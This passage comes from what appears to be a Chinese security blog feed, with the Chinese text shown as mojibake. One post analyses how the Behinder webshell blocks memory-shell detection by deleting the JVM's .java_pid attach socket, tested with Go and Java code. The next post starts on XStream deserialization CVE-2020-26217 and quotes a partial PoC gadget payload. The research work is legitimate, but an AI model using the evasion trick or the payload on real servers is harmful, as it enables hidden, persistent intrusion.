        VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line">            vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">            String fileName = System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)+<span class="string">&quot;.java_pid&quot;</span> + pid;</span><br><span class="line">            System.out.println(fileName);</span><br><span class="line">            Boolean e = (<span class="keyword">new</span> File(fileName)).exists();</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            var12.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            (new File(libPath)).delete();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>æ‰¾ä¸€ä¸ªjvmè¿›ç¨‹ï¼Œè¿è¡ŒtestAttach</li><li>åˆ é™¤å¯¹åº”.java_pidxx</li><li>å†è¿è¡ŒtestAttachï¼Œä¼šå‘ç°æŠ¥é”™ï¼Œsocketè¿ä¸ä¸Š</li></ol><p>å¯ä»¥çœ‹å‡ºï¼Œå†°èé€šè¿‡åˆ é™¤.java_pidï¼Œå®ç°äº†æ— æ³•VirtualMachine.attachã€‚åŸç†å¦‚ä½•ï¼Ÿæ£€æµ‹æ˜¯å¦æœ‰ç»•è¿‡ç©ºé—´ï¼Ÿ</p><h2 id="Java-Attachæœºåˆ¶"><a href="#Java-Attachæœºåˆ¶" class="headerlink" title="Java Attachæœºåˆ¶"></a>Java Attachæœºåˆ¶</h2><p>å‚è€ƒã€1ã€‘ä¸­æ€»ç»“äº†Java çš„3ç§åŠ¨æ€Attachæ–¹æ³•</p><ol><li>ç»§æ‰¿Tool/HotSpotAgent.attachï¼ˆé‡‡ç”¨Serviceability Agentï¼Œç®€ç§°SAï¼‰</li><li>VirtualMachine.attachï¼ˆAttachåˆ°Attach Listenerçº¿ç¨‹åæ‰§è¡Œæœ‰é™å‘½ä»¤ï¼‰</li><li>Perf.getPerf().attachï¼ˆé€šè¿‡PerfDataæ–‡ä»¶è·å–ä¿¡æ¯ï¼‰</li></ol><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>å…¶ä¸­1ä¼šæš‚åœè¿›ç¨‹ï¼Œä¸é€‚ç”¨äºå†…å­˜é©¬çš„æ£€æµ‹ï¼Œ3åªæ˜¯å…³æ³¨è¿›ç¨‹çŠ¶æ€ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºæ€§èƒ½åˆ†æï¼Œå…³æ³¨çš„ç±»ä¸å…¨ï¼Œæ— æ³•ç”¨äºæ£€æµ‹å¼‚å¸¸ç±»ã€‚</p><h3 id="Java-Instrumentation-API"><a href="#Java-Instrumentation-API" class="headerlink" title="Java Instrumentation API"></a>Java Instrumentation API</h3><p>å¼•ç”¨å‚è€ƒã€10ã€‘ï¼ŒJava Instrumentation APiæ”¯æŒå¯åŠ¨æ—¶/è¿è¡Œæ—¶Attach Agent</p><p>å¦‚æœéœ€è¦åœ¨ç›®æ ‡JVMå¯åŠ¨çš„åŒæ—¶åŠ è½½Agentï¼Œéœ€è¦åœ¨Agentä¸­å®ç°ä¸‹é¢çš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void premain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void premain(String agentArgs);</span><br></pre></td></tr></table></figure><p>å¦‚æœå¸Œæœ›åœ¨ç›®æ ‡JVMè¿è¡Œæ—¶åŠ è½½Agentï¼Œåˆ™éœ€è¦å®ç°ä¸‹é¢çš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void agentmain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void agentmain(String agentArgs);</span><br></pre></td></tr></table></figure><p>æœ¬æ–‡åªå…³æ³¨è¿è¡Œæ—¶åŠ è½½Agentï¼Œä¹Ÿå°±æ˜¯VirtualMachine.attachã€‚</p><h3 id="VirtualMachine-attach"><a href="#VirtualMachine-attach" class="headerlink" title="VirtualMachine.attach"></a>VirtualMachine.attach</h3><p><img src="/images/pasted-145.png" alt="upload successful"><br>æ­¤æµç¨‹å›¾éœ€è¦æ­é…å‚è€ƒã€3ã€‘ä¸­çš„è°ƒè¯•è¿‡ç¨‹ï¼Œåˆ†æå¾—å‡º</p><p>JVM æµç¨‹</p><ol><li>init, ç­‰å¾…SIGQUITï¼ˆä¹Ÿæ˜¯SIGBREAKï¼‰</li><li>æ”¶åˆ°SINQUITï¼Œattach_pidéªŒè¯ï¼ˆè¿™ä¸ªä¸æ˜¯å¾ˆé‡è¦ï¼‰</li><li>åˆ¤æ–­æ˜¯å¦æœ‰å¯¹åº”java_pid socketæ–‡ä»¶ï¼Œæ²¡æœ‰åˆ™åˆ›å»º</li><li>å»ºç«‹unix socket tcp server ,ç»‘å®šjava_pid socketé€šé“</li><li>è¿›å…¥å¾ªç¯ï¼Œå“åº”attach client</li><li>æ–°SIGQUITï¼ŒéªŒè¯attach_pid(ä¸é‡è¦), è¿›å…¥5ï¼ˆé‡ç‚¹ï¼Œå¹¶ä¸ä¼šé‡æ–°å»ºserverï¼‰</li></ol><p>åœ¨æ­¥éª¤5å®Œæˆä¹‹åï¼Œåˆ é™¤æ‰java_pid socketæ–‡ä»¶ï¼Œä¼šæ€æ ·ï¼Ÿå¯æ¢å¤å—ï¼Ÿ</p><ol><li>å³ä½¿åˆ é™¤socketé€šé“ï¼Œserverä¸ä¼šå¤±è´¥é‡æ–°å°è¯•è¿æ¥</li><li>å³ä½¿æ–°å»ºç›¸åŒnameçš„unix socketé€šé“ï¼Œclientä¹Ÿæ— æ³•è¿æ¥ï¼Œæ‰€ä»¥ä¸å¯æ¢å¤</li></ol><h3 id="UnixSocket"><a href="#UnixSocket" class="headerlink" title="UnixSocket"></a>UnixSocket</h3><p>ä»¥ä¸‹é€šè¿‡å®éªŒéªŒè¯ä»¥ä¸Šçš„ä¸¤ç‚¹ç»“è®º</p><p>server.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥æ”¶å†…å®¹å¹¶è¿”å›ç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerContext</span><span class="params">(context <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">now := time.Now().String()</span><br><span class="line"><span class="keyword">return</span> now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥æ”¶è¿æ¥å¹¶å¤„ç†</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerConn</span><span class="params">(c net.Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿™é‡Œï¼Œä½ éœ€è¦ parse buf é‡Œçš„æ•°æ®æ¥å†³å®šè¿”å›ä»€ä¹ˆç»™å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="comment">// å‡è®¾ respnoseData æ˜¯ä½ æƒ³è¿”å›çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">fmt.Print(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">result := HandleServerContext(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(result))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Print(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">listener, err := net.ListenUnix(<span class="string">&quot;unix&quot;</span>, addr)</span><br><span class="line"><span class="keyword">defer</span> listener.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot listen to unix domain socket: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on&quot;</span>, listener.Addr())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">c, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Accept: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> HandleServerConn(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‹”å·</span></span><br><span class="line">c, err := net.DialUnix(<span class="string">&quot;unix&quot;</span>, <span class="literal">nil</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;DialUnix failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å†™å‡º</span></span><br><span class="line">context := <span class="string">&quot;hello server&quot;</span></span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(context))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¯»ç»“æœ</span></span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>è¿è¡Œserver</li><li>è¿è¡Œclientï¼Œtcpè¿æ¥okï¼Œæ•°æ®ä¼ è¾“ok</li><li>åˆ é™¤java_pid</li><li>è¿è¡Œclientï¼Œtcpè¿æ¥å¤±è´¥</li><li>nc -lkU java_pidï¼Œåˆ›å»ºç›¸åŒæ–‡ä»¶</li><li>è¿è¡Œclientï¼Œä»ç„¶è¿æ¥å¤±è´¥</li></ol><h3 id="JVMä¿¡å·"><a href="#JVMä¿¡å·" class="headerlink" title="JVMä¿¡å·"></a>JVMä¿¡å·</h3><p>å¦‚ä¸Šï¼Œé€šè¿‡æ¢å¤java_pidé‡å»ºè¿æ¥çš„æ€è·¯æ— æ³•èµ°é€šï¼Œé‚£æœ‰å…¶ä»–çš„æ€è·¯é‡æ–°è®©jvmå»ºç«‹æ–°çš„tcp serverå—ï¼Ÿ</p><p>ç¬¬ä¸€æ­¥æ—¶æ˜¯é€šè¿‡SIGQUITä¿¡å·è§¦å‘jvm init tcp serverçš„ï¼Œæœ‰æ²¡æœ‰å…¶ä»–ä¿¡å·å¯ä»¥é‡ç°å‘¢ï¼Ÿå¯æƒœé€šè¿‡å‚è€ƒã€4ã€‘ï¼Œå¹¶æœªå‘ç°æœ‰å¦‚æ­¤åŠŸèƒ½çš„ä¿¡å·ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡å¤ç°äº†å†°èä¸ºé˜²æ­¢å¸¸è§å†…å­˜é©¬æ£€æµ‹antiAgentçš„åŠŸèƒ½ï¼ˆä¸å¾—ä¸è†œæ‹œbeyondå¤§ä½¬ï¼Œå¯¹Javaå®åœ¨æ˜¯ç†Ÿæ‚‰ï¼‰ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåˆ†æå…¶å®ç°åŸç†ï¼Œå¾—å‡ºæ— æ³•ç»•è¿‡çš„æ‚²æƒ…ç»“è®ºã€‚</p><p>ä¸è¿‡æ— æ³•Attachæœ¬èº«å°±æ˜¯ä¸€ä¸ªå¼ºç‰¹å¾ï¼ˆè™½ç„¶æœ‰äº›/tmpç›®å½•æ¸…ç†ä¼šå¯¼è‡´è¯¯æŠ¥ï¼‰ï¼Œä¹Ÿä½¿å¾—antiAgentæœ‰åˆ©æœ‰å¼Šï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ–Ÿé…Œè€Œç”¨ã€‚</p><p>æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰ç–æ¼ï¼Œæ³è¯·å‘ŠçŸ¥ã€‚</p><p>â€”â€”â€”â€“20210624è¡¥å……â€”â€”â€”â€”</p><p>å‚è€ƒã€11ã€‘ä¸­å¸¦å¤´å¤§å“¥ è¡¥å……äº†å…³äºå†°è3.0beta8ç‰ˆæœ¬windowsçš„å®ç°ï¼ŒAntiAttachåŸç†æ˜¯é€šè¿‡å…³é—­sun.tools.attach.WindowsVirtualMachine pipeï¼Œå¸¦å¤´å¤§å“¥ é€šè¿‡åˆ†æWindowsVirtualMachine JNIçš„å®ç°å¾—å‡ºï¼š</p><blockquote><p>WindowsVirtualMachineæ˜¯é€šè¿‡å‘ç›®æ ‡JVMæ³¨å…¥shellcodeæ¥æ‰§è¡Œæˆ‘ä»¬ä¸ç›®æ ‡JVMçš„é€šä¿¡æŒ‡ä»¤ã€‚Pipeåªæ˜¯ä¸€ç§é€šä¿¡æ‰‹æ®µï¼Œå…³é—­pipeå¹¶ä¸èƒ½å½±å“æˆ‘ä»¬å‘ç›®æ ‡JVMåŠ è½½javaagentã€‚</p></blockquote><p>å¤§å“¥66çš„</p><p>åœ¨linuxä¾§ï¼Œè½¬åŒ–ä¸ºçš„é—®é¢˜æ˜¯ï¼šUnixSocketæ–‡ä»¶åˆ é™¤ä¹‹åå¦‚ä½•æ¢å¤åŸæœ‰çš„serverè¿æ¥ï¼Ÿæœ¬æ–‡åªå°è¯•äº†æ–°å»ºåŒåsocketæ–‡ä»¶ï¼Œæˆ–è€…è¿˜æœ‰å…¶ä»–æ–¹å¼ï¼Ÿè¿™å—è¿˜æ˜¯èœğŸ”ï¼Œæ±‚çŸ¥é“çš„å¤§ä½¬ä»¬æŒ‡ç‚¹ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1]<a href="https://www.jianshu.com/p/542e50edc8e3">Java Attachæœºåˆ¶</a></li><li>[2]<a href="https://www.jianshu.com/p/5e1d3dab8534">RASPç ”å‘è¸©å‘ä¹‹attachå¤±è´¥</a></li><li>[3]<a href="https://mp.weixin.qq.com/s?__biz=MzIzNjI1ODc2OA==&mid=2650886799&idx=1&sn=108c5fdfcd2695594d4f80ff02fc9a70&mpshare=1&scene=21&srcid=0114WsKpUmDXhRtqy8x7JX5w#wechat_redirect">JVMæºç åˆ†æä¹‹Attachæœºåˆ¶å®ç°å®Œå…¨è§£è¯»</a></li><li>[4]<a href="https://www.ibm.com/docs/zh/sdk-java-technology/7?topic=hjps-signals-used-by-jvm">JVM æ‰€ä½¿ç”¨çš„ä¿¡å·</a></li><li>[5]<a href="https://stackoverflow.com/questions/5769877/attachnotsupportedexception-due-to-missing-java-pid-file-in-attach-api">AttachNotSupportedException due to missing java_pid file in Attach API</a></li><li>[6]<a href="https://club.perfma.com/article/1596501">ä½¿ç”¨Goè¯­è¨€å®ç°Attachåˆ°ç›®æ ‡JVMè¿›ç¨‹</a></li><li>[7]<a href="http://jrasp.com/boke/#java-attach-api-%E4%BB%8B%E7%BB%8D">Java InstrumentationåŸç†</a></li><li>[8]<a href="https://paper.seebug.org/1381/">Tomcat å†…å­˜é©¬æ£€æµ‹</a></li><li>[9]<a href="https://cloud.tencent.com/developer/article/1768499">æ‚è°ˆJavaå†…å­˜Webshellçš„æ”»ä¸é˜²</a></li><li>[10]<a href="https://cloud.tencent.com/developer/news/476186">JavaåŠ¨æ€è°ƒè¯•æŠ€æœ¯åŸç†åŠå®è·µ</a></li><li>[11]<a href="https://forum.butian.net/share/142">å†°èbeta8å†…å­˜é©¬é˜²æŸ¥æ€ç ´è§£</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;webshellçš„éšè—ä¸æ£€å‡ºä¸€ç›´ä»¥æ¥éƒ½æ˜¯æ”»é˜²çš„ç„¦ç‚¹ï¼Œéšç€å†…å­˜é©¬çš„ç ”ç©¶ä¸å·¥å…·çš„å…¬å¼€ï¼Œå†…å­˜shellå·²ç„¶æˆä¸ºäº†webshellä¸»æµã€‚&lt;/p&gt;
&lt;p&gt;å¼•ç”¨ã€9ã€‘ä¸­å…³äºæ”»å‡»çš„æ€è·¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;åŸºäºServletè§„èŒƒçš„åˆ©ç”¨ï¼ŒåŠ¨æ€æ³¨å†ŒServletè§„èŒƒä¸­çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬Servletï¼ŒFilterï¼ŒListenerï¼Œè¿™éƒ¨åˆ†çš„å…¬å¼€æ–‡ç« æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚ï¼šåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼ˆ&lt;a href=&quot;https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82&quot;&gt;https://xz.aliyun.com/t/7388ï¼‰ã€‚&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;åŸºäºç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨ï¼Œæ¡†æ¶ä¸€èˆ¬å¯¹äºServletåˆè¿›è¡Œäº†ä¸€å±‚å°è£…ï¼ŒåŠ¨æ€æ³¨å†Œæ¡†æ¶çš„è·¯ç”±ï¼Œæ–‡ç« ï¼šåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ï¼ˆ&lt;a href=&quot;https://www.anquanke.com/post/id/198886%EF%BC%89&quot;&gt;https://www.anquanke.com/post/id/198886ï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;åŸºäºjavaagentä¿®æ”¹Servletå¤„ç†æµç¨‹ä¸­çš„å­—èŠ‚ç ï¼Œå·¥å…·ï¼šmemShellï¼ˆ&lt;a href=&quot;https://github.com/rebeyond/memShell%EF%BC%89&quot;&gt;https://github.com/rebeyond/memShellï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¼•ç”¨ã€8ã€‘ä¸­å…³äºæ£€æµ‹çš„æ€è·¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§æ”»å‡»æ–¹å¼ï¼Œä»é˜²å®ˆæ–¹çš„è§’åº¦æ¥è¯´ï¼Œæ£€æµ‹çš„æ–¹å¼éƒ½æ˜¯é€šè¿‡java instrumentationæœºåˆ¶ï¼Œå°†æ£€æµ‹jaråŒ…attachåˆ°tomcat jvmï¼Œæ£€æŸ¥åŠ è½½åˆ°jvmä¸­çš„ç±»æ˜¯å¦å¼‚å¸¸ã€‚æ•´ä½“æ£€æµ‹æ€è·¯ä¸ºï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è·å–tomcat jvmä¸­æ‰€æœ‰åŠ è½½çš„ç±»&lt;/li&gt;
&lt;li&gt;éå†æ¯ä¸ªç±»ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºé£é™©ç±»ã€‚æˆ‘ä»¬æŠŠå¯èƒ½è¢«æ”»å‡»æ–¹æ–°å¢/ä¿®æ”¹å†…å­˜ä¸­çš„ç±»ï¼Œæ ‡è®°ä¸ºé£é™©ç±»ï¼ˆæ¯”å¦‚å®ç°äº†filter/servletçš„ç±»ï¼‰&lt;/li&gt;
&lt;li&gt;éå†é£é™©ç±»ï¼Œæ£€æŸ¥æ˜¯å¦ä¸ºwebshellï¼š&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥é«˜é£é™©ç±»çš„classæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›&lt;/li&gt;
&lt;li&gt;åç¼–è¯‘é£é™©ç±»å­—èŠ‚ç ï¼Œæ£€æŸ¥javaæ–‡ä»¶ä¸­åŒ…å«æ¶æ„ä»£ç &lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;æœ‰æ”»æœ‰é˜²ï¼Œè€Œé˜²å¾¡åˆå¼•å‘æ”»å‡»çš„å‡çº§ï¼Œå†°èæœ€æ–°ç‰ˆå·²ç»åŠ å…¥äº†åVirtualMachine.AttachåŠŸèƒ½ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="å†°è" scheme="http://m0d9.me/tags/%E5%86%B0%E8%9D%8E/"/>
    
    <category term="Attach" scheme="http://m0d9.me/tags/Attach/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–è¯¦è§£ï¼ˆäºŒï¼‰</title>
    <link href="http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-05-10T09:04:00.000Z</published>
    <updated>2022-03-21T06:01:46.711Z</updated>
    
    <content type="html"><![CDATA[<p>å‰æ–‡å·²ç»è®²è¿‡XStreamçš„ååºåˆ—åŒ–ç‰¹æ€§åŠæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œä»¥åŠ&lt;=1.4.6ç‰ˆæœ¬çš„å‡ ä¸ªgadgetï¼Œåœ¨æ­¤èƒŒæ™¯ä¸Šï¼Œæœ¬èŠ‚å‡†å¤‡å¤ç°æŠ«éœ²çš„å‡ ä¸ªRCE CVEï¼Œæ­£å‘åˆ†æä¸‹ã€‚</p><p>XStreamå›¢é˜Ÿå¾ˆæœ‰æ„æ€ï¼Œå®‰å…¨å…¬å‘Šä¼šæŠŠPOCä¹Ÿå…¬å¼€ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://x-stream.github.io/security.html%E3%80%82">https://x-stream.github.io/security.htmlã€‚</a></p><h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>è¿™ä¸ªå…¶å®å°±æ˜¯Wh1t3p1gå¸ˆå‚…ä¸­æåˆ°çš„ç¬¬4ä¸ªImageIO gadgetï¼Œåœ¨marshalsec gadgets ImageIOä¸­ä¹Ÿæœ‰ï¼Œä¸‹é¢æ­£å‘è·Ÿè¸ªä¸‹ã€‚</p><h3 id="Wh1t3p1gå¸ˆå‚…çš„POC"><a href="#Wh1t3p1gå¸ˆå‚…çš„POC" class="headerlink" title="Wh1t3p1gå¸ˆå‚…çš„POC"></a>Wh1t3p1gå¸ˆå‚…çš„POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                